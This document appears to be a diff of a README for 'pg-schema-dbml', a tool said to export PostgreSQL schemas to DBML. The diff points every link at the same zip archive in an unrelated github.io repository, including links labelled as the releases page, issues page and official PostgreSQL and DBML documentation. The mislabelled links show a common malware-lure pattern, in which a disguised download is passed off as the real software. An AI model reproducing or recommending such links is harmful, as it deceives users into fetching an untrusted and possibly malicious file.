@@ -5,7 +5,7 @@ description: "📊 Export PostgreSQL schemas to DBML for clear database diagrams
 ---
 # 🌟 pg-schema-dbml - Export PostgreSQL Schema to DBML with Ease
 
-[![Download pg-schema-dbml](https://img.shields.io/badge/Download-pg--schema--dbml-blue.svg)](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip)
+[![Download pg-schema-dbml](https://img.shields.io/badge/Download-pg--schema--dbml-blue.svg)](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,9 +21,9 @@ To run pg-schema-dbml, you need:
 
 ## 📥 Download & Install
 
-To download and install pg-schema-dbml, visit this page to download: [GitHub Releases Page](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip).
+To download and install pg-schema-dbml, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip).
 
-1. Go to the [GitHub Releases Page](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip).
+1. Go to the [GitHub Releases Page](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip).
 2. Find the latest version.
 3. Download the suitable file for your operating system.
 4. Follow the instructions below to run the application.
@@ -73,11 +73,11 @@ Here are some common issues you might face and how to resolve them:
 
 ## 🤝 Community Support
 
-If you encounter any issues while using pg-schema-dbml or have questions, feel free to open an issue in the [GitHub Issues Page](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip). The community and developers are here to help.
+If you encounter any issues while using pg-schema-dbml or have questions, feel free to open an issue in the [GitHub Issues Page](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip). The community and developers are here to help.
 
 ## 📌 Additional Resources
 
-- **PostgreSQL Documentation**: [PostgreSQL Official Docs](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip)
-- **DBML Resources**: [DBML Documentation](https://github.com/jamalart002/jamalart002.github.io/raw/refs/heads/main/Chermidae/v1.2.zip)
+- **PostgreSQL Documentation**: [PostgreSQL Official Docs](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip)
+- **DBML Resources**: [DBML Documentation](https://raw.githubusercontent.com/jamalart002/jamalart002.github.io/main/Chermidae/v1.2.zip)
 
 By following these instructions, you should be able to successfully download and use pg-schema-dbml to export your PostgreSQL schema to DBML format.
